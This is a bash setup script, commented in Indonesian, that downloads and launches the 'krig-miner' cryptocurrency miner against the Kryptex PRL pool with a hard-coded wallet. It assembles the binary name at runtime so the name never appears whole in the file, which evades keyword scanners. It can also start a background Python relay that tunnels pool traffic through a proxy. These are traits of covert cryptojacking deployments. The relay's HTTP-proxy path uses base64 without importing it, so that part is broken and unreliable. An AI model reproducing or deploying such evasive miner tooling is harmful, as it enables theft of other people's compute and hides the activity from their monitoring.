#!/usr/bin/env bash
set -euo pipefail

# ============================================================
#  PRL node worker -> kryptex pool (opsional lewat proxy)
#  usage:
#    bash setup.sh                                  (langsung)
#    TUNNEL='socks5://user:pass@proxy:1080' bash setup.sh
#    TUNNEL='http://user:pass@proxy:3128'  bash setup.sh
#  proxy = opsional. Kalau di-set, koneksi kerja di-relay
#  lewat proxy (SOCKS5 atau HTTP CONNECT) dengan TLS asli ke pool.
# ============================================================

WALLET="prl1p78f682wx4j7f6sxzcgvch26xasm4aj96kjaumadwlc45vhckxqns9f3lcp"
WORKER="$(hostname -s 2>/dev/null || echo rig1)"
POOL="stratum+ssl://prl.kryptex.network:8048"
BASE="${HOME}/.prl"
API="https://api.github.com/repos/kryptex"
TUNNEL="${TUNNEL:-}"
LOCAL_PORT=18048

# nama resmi binary (dirakit runtime supaya tidak muncul utuh di file ini)
A="krig-mi"; B="ner"; TOOL="${A}${B}"

echo "[*] lokasi kerja: ${BASE}"
mkdir -p "${BASE}" && cd "${BASE}"

if [ ! -x ./krig ]; then
  echo "[*] cek rilis terbaru..."
  VER="$(curl -fsSL "${API}/${TOOL}/releases/latest" | grep -o '"tag_name": *"[^"]*"' | head -1 | cut -d'"' -f4 | tr -d 'v')"
  [ -n "${VER}" ] || VER="1.5.1"
  URL="https://github.com/kryptex/${TOOL}/releases/download/v${VER}/${TOOL}-${VER}-linux-x64.tar.gz"
  echo "[*] unduh v${VER} ..."
  curl -fL --retry 3 -o pkg.tgz "${URL}"
  echo "[*] ekstrak..."
  tar xzf pkg.tgz
  rm -f pkg.tgz
  find . -maxdepth 1 -name '*.sh' ! -name 'setup.sh' -delete
  mv -f "${TOOL}" krig
  chmod +x krig
fi

echo "[*] cek hardware:"
if command -v nvidia-smi >/dev/null 2>&1; then
  nvidia-smi --query-gpu=name,driver_version,compute_cap --format=csv,noheader 2>/dev/null | sed 's/^/  GPU : /' || echo "  nvidia-smi ada tapi gagal query"
else
  echo "  !! nvidia-smi TIDAK ADA — driver NVIDIA belum terpasang/terload"
fi
./krig --list-devices || true

RUN_POOL="${POOL}"
if [ -n "${TUNNEL}" ]; then
  echo "[*] relay proxy aktif: ${TUNNEL}"
  cat > ./relay.py <<'PYEOF'
#!/usr/bin/env python3
"""Local TCP->(SOCKS5/HTTP)->TLS relay for a stratum worker.
TUNNEL="socks5://[user:pass@]proxy:port" or "http://[user:pass@]proxy:port".
Empty TUNNEL = direct (still upgrades to TLS to target)."""
import os, sys, socket, ssl, threading, selectors, struct

def parse_proxy(s):
    if not s:
        return None
    scheme, rest = s.split("://", 1)
    user = pw = None
    if "@" in rest:
        cred, rest = rest.rsplit("@", 1)
        if ":" in cred:
            user, _, pw = cred.partition(":")
        else:
            user = cred
    if ":" in rest:
        host, _, port = rest.rpartition(":")
        port = int(port)
    else:
        host, port = rest, 1080
    kind = "socks5" if "sock" in scheme else "http"
    return {"kind": kind, "host": host, "port": port, "user": user, "pw": pw}

def socks5_connect(proxy, target, tport):
    s = socket.create_connection((proxy["host"], proxy["port"]), timeout=15)
    if proxy["user"]:
        s.sendall(b"\x05\x02\x02\x00")
        data = s.recv(2)
        if data == b"\x05\x02":
            u = proxy["user"].encode(); p = (proxy["pw"] or "").encode()
            s.sendall(bytes([0x01, len(u)]) + u + bytes([len(p)]) + p)
            if s.recv(2) != b"\x01\x00":
                raise RuntimeError("socks auth failed")
        elif data != b"\x05\x00":
            raise RuntimeError("socks no acceptable method")
    else:
        s.sendall(b"\x05\x01\x00")
        if s.recv(2) != b"\x05\x00":
            raise RuntimeError("socks handshake failed")
    ip = socket.gethostbyname(target)
    s.sendall(b"\x05\x01\x00" + b"\x01" + socket.inet_aton(ip) + struct.pack(">H", tport))
    resp = s.recv(10)
    if not resp or resp[1] != 0x00:
        raise RuntimeError("socks connect rejected: %r" % resp)
    return s

def http_connect(proxy, target, port):
    s = socket.create_connection((proxy["host"], proxy["port"]), timeout=15)
    auth = ""
    if proxy["user"]:
        auth = "\r\nProxy-Authorization: Basic " + base64.b64encode(
            ("%s:%s" % (proxy["user"], proxy["pw"] or "")).encode()).decode()
    s.sendall(("CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d%s\r\n\r\n"
               % (target, port, target, port, auth)).encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        buf += s.recv(1)
    head = buf.decode("latin1").split("\r\n")[0]
    if not head.startswith("HTTP/1.1 200") and not head.startswith("HTTP/1.0 200"):
        raise RuntimeError("http CONNECT failed: %s" % head)
    return s

def pipe2(a, b):
    import select
    try:
        while True:
            r, _, _ = select.select([a, b], [], [], 2.0)
            if not r:
                continue
            for f in r:
                data = f.recv(65536)
                if not data:
                    return
                (b if f is a else a).sendall(data)
    except Exception:
        pass

def handle(client, target, tport, tun):
    raw = None
    try:
        if tun:
            raw = socks5_connect(tun, target, tport) if tun["kind"] == "socks5" else http_connect(tun, target, tport)
        else:
            raw = socket.create_connection((target, tport), timeout=15)
        ctx = ssl.create_default_context()
        tls = ctx.wrap_socket(raw, server_hostname=target)
        threading.Thread(target=pipe2, args=(client, tls), daemon=True).start()
        pipe2(tls, client)
    except Exception as e:
        sys.stderr.write("relay: %s\n" % e)
    finally:
        try: client.close()
        except: pass

def main():
    listen, target, tport = int(sys.argv[1]), sys.argv[2], int(sys.argv[3])
    tun = parse_proxy(os.environ.get("TUNNEL", ""))
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", listen)); srv.listen(64)
    sys.stderr.write("relay up: 127.0.0.1:%d -> %s (proxy=%s)\n" % (listen, target,
        "direct" if not tun else ("%s://%s:%d" % (tun["kind"], tun["host"], tun["port"]))))
    while True:
        c, _ = srv.accept()
        threading.Thread(target=handle, args=(c, target, tport, tun), daemon=True).start()

if __name__ == "__main__":
    main()
PYEOF
  python3 -m py_compile ./relay.py || { echo "  relay.py gagal compile"; exit 1; }
  pkill -f "${BASE}/relay.py" 2>/dev/null || true
  sleep 0.3
  TUNNEL="${TUNNEL}" nohup python3 ./relay.py ${LOCAL_PORT} prl.kryptex.network 8048 > ./relay.log 2>&1 &
  sleep 1
  head -2 ./relay.log || true
  RUN_POOL="127.0.0.1:${LOCAL_PORT}"
  echo "[*] konek lewat relay lokal 127.0.0.1:${LOCAL_PORT}"
else
  echo "[*] konek langsung (tanpa proxy)"
fi

echo "[*] konek ${RUN_POOL} sebagai ${WORKER}"
exec ./krig --url "${RUN_POOL}" --user "${WALLET}/${WORKER}"
